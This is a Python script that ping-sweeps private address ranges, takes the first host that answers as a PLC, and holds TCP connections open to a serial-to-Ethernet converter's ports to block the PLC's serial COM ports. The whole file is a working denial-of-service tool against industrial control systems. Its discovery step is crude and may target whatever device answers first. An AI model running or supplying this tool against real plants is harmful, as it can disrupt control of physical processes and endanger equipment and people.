import socket
import time
import threading
import subprocess
import re

# Configuration
SLEEP_DURATION = 3600  # Hold the connection for 1 hour (adjust as needed)

def find_plc_ip():
    """
    Attempts to find the PLC's IP address by pinging common network ranges
    and looking for a device that responds and might be a PLC.
    This is a basic example and might need adjustment based on your specific network setup.
    """
    print("Attempting to discover PLC IP address...")
    # Adjust these IP ranges to match your network.  Consider using a configuration file
    # or command-line arguments for greater flexibility.
    ip_ranges = ["10.0.0.", "192.168.1.", "172.16.0."]

    for ip_range in ip_ranges:
        for i in range(1, 255):  # Iterate through possible IP addresses in the range
            ip_address = ip_range + str(i)
            try:
                # Use ping to check if the IP address is reachable
                result = subprocess.run(["ping", "-n", "1", ip_address], capture_output=True, timeout=2, text=True)
                if result.returncode == 0:  # Ping successful
                    # Basic check if the device might be a PLC:
                    # This is a placeholder.  Real-world PLC identification requires more sophisticated methods
                    # such as looking for specific open ports or analyzing network traffic.
                    print(f"Possible PLC IP address found: {ip_address}")
                    return ip_address  # Return immediately on the first hit. Remove this if you want to check the entire range.

            except subprocess.TimeoutExpired:
                pass  # Ignore timeout errors

    print("Could not automatically find the PLC IP address.")
    return None

def block_serial_com_port(plc_ip, com_port):
    """
    Blocks a serial COM port on a serial-to-Ethernet converter by holding a TCP connection open.
    """
    converter_port = 20000 + com_port  # Assuming converter port convention
    print(f"Attempting to block COM port {com_port} (TCP port {converter_port}) on PLC IP: {plc_ip}")

    try:
        # Create a TCP socket
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)  # Set a connection timeout

        # Connect to the serial-to-Ethernet converter
        s.connect((plc_ip, converter_port))
        print(f"Successfully connected to {plc_ip}:{converter_port}")

        # Hold the connection open by receiving data in a loop.
        # We don't send any data to avoid accidentally sending commands to the PLC.
        while True:
            try:
                data = s.recv(1024)  # Receive up to 1024 bytes
                if not data:  # Connection closed by the other side
                    print("Connection closed by remote host.")
                    break
                #print(f"Received data: {data.decode('utf-8', errors='ignore')}")  # Optional: Print received data
            except socket.timeout:
                # Socket timeout, connection is still open
                pass
            except Exception as e:
                print(f"Error receiving data: {e}")
                break
            time.sleep(1) # Reduce CPU usage

    except socket.timeout:
        print(f"Connection to {plc_ip}:{converter_port} timed out.")
    except ConnectionRefusedError:
        print(f"Connection to {plc_ip}:{converter_port} refused.  Is the port open and the PLC reachable?")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        if 's' in locals(): # Check if the socket object was created.
            s.close()
        print(f"Connection to {plc_ip}:{converter_port} closed.")

def main():
    plc_ip = find_plc_ip()

    if not plc_ip:
        plc_ip = input("Enter the PLC IP address manually: ")  # Prompt for IP if not found
        if not plc_ip:
            print("PLC IP address is required. Exiting.")
            return
    # Example usage: Block COM ports 1, 2, and 3.  Modify as needed.
    com_ports_to_block = [1, 2, 3]
    threads = []

    for com_port in com_ports_to_block:
        thread = threading.Thread(target=block_serial_com_port, args=(plc_ip, com_port))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()  # Wait for all threads to complete.

    print("Blocking attempts complete.")

if __name__ == "__main__":
    main()